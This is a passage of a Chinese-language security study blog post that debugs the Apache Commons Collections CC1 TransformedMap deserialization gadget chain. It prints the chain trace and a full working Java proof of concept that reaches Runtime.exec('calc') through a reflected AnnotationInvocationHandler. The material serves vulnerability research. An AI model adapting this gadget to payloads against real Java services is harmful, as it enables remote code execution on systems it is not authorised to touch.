+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>断点走一下 <code>readObject()</code> 的 if 判断</p>
+<p>前三行循环获取键值对获取</p>
+<p><img alt="image-20231114171157770" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114171157770.png"></p>
+<p>总览</p>
+<p><img alt="image-20231114172318807" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114172318807.png"></p>
+<p><code>annotationType = AnnotationType.getInstance(type);</code> 获取 type 成员方法，没有会新建一个AnnotationType</p>
+<p><img alt="image-20231114172915205" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114172915205.png"></p>
+<p>AnnotationInvocationHandler 构造方法内可以给 type 赋值</p>
+<p><img alt="image-20231114172416803" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114172416803.png"></p>
+<p>上面代码，赋值的是 Override，Java的注释类，而 Override 没有参数</p>
+<p><img alt="image-20231114173211138" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114173211138.png"></p>
+<p>换成 Target，然后 map 的 put，进入的键值对的 key 要改成 Target 参数的名，且值不为 null</p>
+<p><img alt="image-20231114173329370" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114173329370.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;value&#34;</span>,<span style="color:#e6db74">&#34;abc&#34;</span>);
+</span></span></code></pre></div><p>继续调试，可以执行 <code>setValue()</code>，继续跟进，发现 <code>checkSetValue(value)</code> 中 value 的值不是构想的Runtime</p>
+<p><img alt="image-20231114174205086" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114174205086.png"></p>
+<p>第二个 if 判断是否对象可以强转，最后的 <code>setValue(value)</code> 的 value 是 new 的 AnnotationTypeMismatchExceptionProxy，固定了，改不了</p>
+<p><img alt="image-20231114173932154" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114173932154.png"></p>
+<h4 id="constanttransformer">ConstantTransformer</h4>
+<p>这里的 transform 无论接受什么，返回值不会改变，都是 iConstant</p>
+<p><img alt="image-20231114181215574" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20231114181215574.png"></p>
+<h3 id="gadget-chain">Gadget chain</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	Gadget chain：
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   	 objectInputStream.readobject()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        	AnnotationInvocationHandler.readobject()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            	TransformedMap.entrySet()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            		AbstractInputCheckedMapDecorator$MapEntry.setValue()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">               	 	(TransformedMap继承AbstractInputCheckedMapDecorator)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    	TransformedMap.checkSetvalue()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                       	 ChainedTransformner.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                          	  ConstantTransformer.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                           	 InvokerTransformer.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                             	   Method.invoke()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                            	        Class.getMethod()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                          	  InvokerTransformer.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                           	     Method.invoke()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                         	           Runtime.getRuntime()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                          	  InvokerTransformer.transform()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                            	    Method.invoke()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                            	        Runtime.exec()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span></code></pre></div><h3 id="poc">Poc</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> Gadget.CC1;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.Transformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ChainedTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.ConstantTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.functors.InvokerTransformer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.collections.map.TransformedMap;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.*;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.annotation.Target;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Constructor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.lang.reflect.Method;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.HashMap;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.util.Map;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CC1_Transformer</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ChainedTransformer链式执行</span>
+</span></span><span style="display:flex;"><span>        Transformer<span style="color:#f92672">[]</span> transformers <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Transformer<span style="color:#f92672">[]</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> ConstantTransformer(Runtime.<span style="color:#a6e22e">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;getMethod&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>,Class<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;getRuntime&#34;</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;invoke&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{Object.<span style="color:#a6e22e">class</span>,Object<span style="color:#f92672">[]</span>.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>}),
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">new</span> InvokerTransformer(<span style="color:#e6db74">&#34;exec&#34;</span>,<span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{String.<span style="color:#a6e22e">class</span>},<span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;calc&#34;</span>})
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>        ChainedTransformer chainedTransformer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ChainedTransformer(transformers);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//        chainedTransformer.transform(Runtime.class);  // test</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        HashMap<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> map <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> HashMap<span style="color:#f92672">&lt;&gt;</span>();
+</span></span><span style="display:flex;"><span>        map.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;value&#34;</span>,<span style="color:#e6db74">&#34;abc&#34;</span>);  <span style="color:#75715e">// 添加键值对</span>
+</span></span><span style="display:flex;"><span>        Map<span style="color:#f92672">&lt;</span>Object,Object<span style="color:#f92672">&gt;</span> transformedMap <span style="color:#f92672">=</span> TransformedMap.<span style="color:#a6e22e">decorate</span>(map,<span style="color:#66d9ef">null</span>,chainedTransformer);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// AnnotationInvocationHandler类是default，不能直接获取</span>
+</span></span><span style="display:flex;"><span>        Class c <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
+</span></span><span style="display:flex;"><span>        Constructor  annotationInvocationHandlerConstructor <span style="color:#f92672">=</span> c.<span style="color:#a6e22e">getDeclaredConstructor</span>(Class.<span style="color:#a6e22e">class</span>,Map.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>        annotationInvocationHandlerConstructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> annotationInvocationHandlerConstructor.<span style="color:#a6e22e">newInstance</span>(Target.<span style="color:#a6e22e">class</span>,transformedMap);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(bos);
+</span></span><span style="display:flex;"><span>        oos.<span style="color:#a6e22e">writeObject</span>(o);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 反序列化</span>
+</span></span><span style="display:flex;"><span>        ByteArrayInputStream bis <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayInputStream(bos.<span style="color:#a6e22e">toByteArray</span>());
+</span></span><span style="display:flex;"><span>        ObjectInputStream ois <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectInputStream(bis);
+</span></span><span style="display:flex;"><span>        ois.<span style="color:#a6e22e">readObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='tags'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z" />
+<line x1="7" y1="7" x2="7" y2="7" />
+</svg>
+<span class='screen-reader-text'>Tags: </span><a class='tag' href='/tags/java/'>Java</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='prev-entry sep-before'>
+      <a href='/docs/java/urldns/'>
+        <span aria-hidden='true'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="20" y1="12" x2="4" y2="12" />
+<polyline points="10 18 4 12 10 6" />
+</svg>
+ Previous</span>
+        <span class='screen-reader-text'>Previous post: </span>URLDNS</a>
+    </div><div class='next-entry sep-before'>
+      <a href='/docs/java/cc1-lazymap/'>
+        <span class='screen-reader-text'>Next post: </span>CC1-LazyMap<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/n2ryx' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:experience_0109@163.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p></p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
